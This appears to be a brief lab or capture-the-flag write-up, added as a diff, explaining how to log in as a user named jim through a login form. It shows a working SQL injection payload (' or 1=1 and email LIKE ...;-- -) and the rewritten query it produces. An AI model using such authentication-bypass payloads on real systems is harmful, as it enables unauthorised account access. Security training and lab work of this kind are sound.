@@ -1,0 +1,9 @@
+try inserting the email as : test'
+we see that we get the SQL statement to fetch user details
+SELECT * FROM Users WHERE email = 'test'' AND password = '1aff91130ca46149c98cfbcb362432bb'
+
+in order to login as jim, a wise guess is that his email could contain the term "jim"
+so by setting the injection string as 
+' or 1=1 and email LIKE ('%jim%');-- -
+the query is now modified to the following, and hence authenticating us as jim
+SELECT * FROM Users WHERE email = '' or 1=1 and email LIKE ('%jim%');-- -' AND password = '1aff91130ca46149c98cfbcb362432bb'
